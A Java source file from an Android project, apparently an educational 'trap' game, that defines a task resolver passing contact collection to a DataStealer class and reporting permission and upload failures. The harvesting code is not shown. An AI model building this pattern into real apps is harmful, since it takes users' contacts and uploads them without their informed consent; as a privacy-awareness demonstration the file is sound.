package de.hpi3d.gamepgrog.trap.tasks;

import android.app.Activity;

import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.future.Promise;

public class FakeContactsTaskResolver extends SyncTaskResolver<Contact> {

    public FakeContactsTaskResolver(String[] permissionsNeeded) {
        super("contact", permissionsNeeded, DataStealer::takeContactData);
    }

    @Override
    protected int getResultMessage(Task task, int result) {
        switch (result) {
            case PERMISSION_FAILED:
                return R.string.fake_contact_permission_failed;
            case UPLOAD_FAILED:
                return R.string.fake_contact_upload_failed;
            default:
                return NO_MESSAGE;
        }
    }

    @Override
    protected Promise<Boolean> isTaskFinished(Activity app, Task task) {
        return Promise.createResolved(true);
    }
}
